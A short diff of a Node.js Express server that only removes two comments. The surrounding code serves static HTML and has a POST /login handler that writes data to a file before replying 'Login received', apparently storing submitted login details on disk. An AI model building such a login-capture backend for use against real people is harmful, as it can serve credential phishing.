@@ -5,7 +5,6 @@ const fs = require('fs');
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Serve static files like your HTML
 app.use(express.static('public'));
 
 app.post('/login', (req, res) => {
@@ -17,7 +16,7 @@ app.post('/login', (req, res) => {
       console.error('Error writing to file:', err);
       return res.status(500).send('Server error');
     }
-    res.send('Login received'); // Can redirect to another page if needed
+    res.send('Login received');
   });
 });
 
